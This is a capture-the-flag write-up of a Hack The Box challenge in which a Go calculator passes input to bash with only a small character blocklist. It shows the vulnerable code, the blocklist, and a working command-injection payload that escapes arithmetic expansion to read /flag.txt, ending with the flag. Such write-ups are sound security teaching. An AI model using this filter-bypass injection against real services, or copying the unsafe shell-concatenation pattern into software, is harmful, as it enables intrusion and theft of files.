> I've made the coolest calculator.
> It's pretty simple, I don't need to parse the input and take care of execution order, bash does it for me!
> I've also made sure to remove characters like $ or \` to not allow code execution, that will surely be enough.

> Author: **[raulojeda22][author-profile]**

## The service

It lets us perform basic math and has some kind of filtering in place:

```
CALCULATOR
Operation: 3+2
5
Operation: cat</flag.txt
Operation: 2*3));cat</flag.txt
1	';' removed
```

The calculations are routed to bash:

```golang
command := "echo $((" + op + "))"
output, _ := shell.Execute(context.Background(), command)
```

The list of forbidden characters is rather small:

```golang
firewall := []string{" ", "`", "$", "&", "|", ";", ">"}
```

There is most likely several solutions!

## Finding the weakness

For me the idea was to dissociate the internal parenthesis from the external one:
go from an arithmetic expansion `$(( ... ))` to a command substitution `$( ... )`

For example this command works in the current directory:

```shell
echo $((cat<README.md)</)
echo $((ls)</)
```

But there's one more closing parenthesis. I tried escaping it:

```shell
echo $((ls)</\))
```

It fails with the error:

```
bash: /): No such file or directory
```

However, with the append redirection `<<`, `bash` only outputs a warning:

```shell
echo $((ls)<</\))
```

```
# bash: warning: here-document at line 1 delimited by end-of-file (wanted `/)')
```

Thanks to the `Dockerfile` we know the location of the file:

```shell
cat</flag.txt)<</\
```

> `HTB{Ju4nck3r_15_y0ur_n4m3_15nt_1t?}`

[author-profile]: https://app.hackthebox.com/users/82112
[bash-hackers]: https://wiki.bash-hackers.org/syntax/expansion/cmdsubst
